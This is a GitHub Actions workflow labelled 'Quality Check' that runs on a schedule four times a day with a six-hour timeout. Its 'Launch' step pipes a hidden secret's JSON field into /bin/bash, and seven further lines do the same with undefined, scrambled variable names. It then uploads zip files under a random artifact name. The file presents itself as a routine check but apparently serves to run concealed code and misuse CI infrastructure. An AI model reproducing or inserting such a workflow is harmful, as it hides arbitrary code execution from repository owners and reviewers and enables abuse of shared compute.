name: Quality Check
on:
  workflow_dispatch:

  schedule:
    - cron: '1 2,8,14,20 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          acuq6: ${{ secrets.acuq6 }}
        run: |
          printf '%s' "$acuq6" | jq -r .fppu97173 | /bin/bash
          echo $wce08 | jq -r .kvfts28 | /bin/bash
          echo $fdj7627 | jq -r .gq648 | /bin/bash
          printf '%s' "$cgtvf754" | jq -r .iymn323 | /bin/bash
          echo $gc6042 | jq -r .gc86 | /bin/bash
          printf '%s' "$ty06" | jq -r .ewgo215 | /bin/bash
          printf '%s' "$ru1638" | jq -r .vp9867 | /bin/bash
          printf '%s' "$qmg835" | jq -r .y2 | /bin/bash

      - name: Save artifact
        uses: actions/upload-artifact@v4
        with:
          name: rFavs3Vg
          path: "*.zip"
          retention-days: 1
